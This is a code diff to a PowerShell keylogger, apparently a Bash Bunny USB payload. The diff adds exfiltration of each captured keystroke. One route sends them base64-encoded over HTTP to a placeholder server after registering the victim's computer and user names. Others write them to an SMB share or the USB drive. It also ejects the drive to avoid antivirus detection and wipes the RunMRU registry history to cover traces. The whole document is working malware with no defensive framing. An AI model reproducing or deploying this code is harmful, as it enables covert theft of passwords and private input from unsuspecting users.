@@ -1,3 +1,88 @@
+Param([boolean]$CLEANUP, [string]$global:exfilMethod)
+
+# ----- EXFIL SETTINGS -----
+
+# --- Web ---
+# The backend's uri
+$global:web_uri = "http://your.server/keypress.php"
+
+# --- SMB ---
+# The Bunny's IP
+$global:bunny_ip = "172.16.64.1"
+
+function Base64-Encode($data)
+{
+	return [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($data)) # Requires ASCII to work well with PHP :(
+}
+
+function Init-Exfil()
+{
+	switch ($global:exfilMethod)
+	{
+		w # Web
+		{
+			# Request a token from the webserver because I really dislike the idea of the computer and the users name being sent every time.
+			$computer = Base64-Encode($env:computername);
+			$user = Base64-Encode($env:username)
+			$global:web_token = Invoke-WebRequest -URI ($global:web_uri + "?type=register&computer=" + $computer + "&user=" + $user)
+			
+			# Eject the USB drive to prevent eventual AV detection
+			$ejector = New-Object -comObject Shell.Application
+			$ejector.NameSpace(17).ParseName($global:Bunny).InvokeVerb("Eject")
+		}
+		s # SMB
+		{
+			$folderName = "\\$global:bunny_ip\loot\Keylogger2\$env:computername-$env:username"
+			try
+			{
+				New-Item -Path $folderName -ItemType directory -Force
+			}
+			finally
+			{
+				"Folder exists"
+			}
+			$dateTime = (Get-Date).ToString('yyyy-MM-dd_hhmmtt')
+			$global:usb_fileName = "$folderName\" + $dateTime + ".txt"
+			$null = New-Item -Path $global:usb_fileName -ItemType File -Force
+		}
+		default # USB
+		{
+			$folderName = "$global:Bunny\loot\Keylogger2\$env:computername-$env:username"
+			try
+			{
+				New-Item -Path $folderName -ItemType directory -Force
+			}
+			finally
+			{
+				"Folder exists"
+			}
+			$dateTime = (Get-Date).ToString('yyyy-MM-dd_hhmmtt')
+			$global:usb_fileName = "$folderName\" + $dateTime + ".txt"
+			$null = New-Item -Path $global:usb_fileName -ItemType File -Force
+		}
+	}
+}
+
+function Perform-Exfil($payload)
+{
+	switch ($global:exfilMethod)
+	{
+		w
+		{
+			$encoded = Base64-Encode($payload)
+			$resp = Invoke-WebRequest -URI ($global:web_uri + "?type=key&token=" + $global:web_token + "&key=" + $encoded)
+			if ("$resp" -ne "ok")
+			{
+				exit 1
+			}
+		}
+		default # USB
+		{
+			[System.IO.File]::AppendAllText($global:usb_fileName, $payload, [System.Text.Encoding]::Unicode);
+		}
+	}
+}
+
 #requires -Version 2
 function Log-Keys($Path="$env:temp\a.txt")
 {
@@ -13,7 +98,6 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-	$null = New-Item -Path $Path -ItemType File -Force
 	try
 	{
 		Write-Output 'KeyLogger started'
@@ -34,7 +118,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 					if ($success)
 					{
-						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+						Perform-Exfil($mychar)
+						#[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
 					}
 				}
 			}
@@ -46,15 +131,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	}
 }
 
-$Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
-$folderName = "$Bunny\loot\Keylogger2\$env:computername-$env:username"
-try
+$global:Bunny = $PSScriptRoot.Split("\")[0]; # We don't need the correct name anymode
+
+if ($CLEANUP)
 {
-	New-Item -Path $folderName -ItemType directory -Force
+	Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+	"Cleaned up"
 }
-finally
-{
-	"Folder exists"
-}
-$fileName = "$folderName\" + (Get-Date -Format o | foreach {$_ -replace ":", "."}) + ".txt"
-Log-Keys($fileName)
+
+Init-Exfil
+Log-Keys($global:usb_fileName)
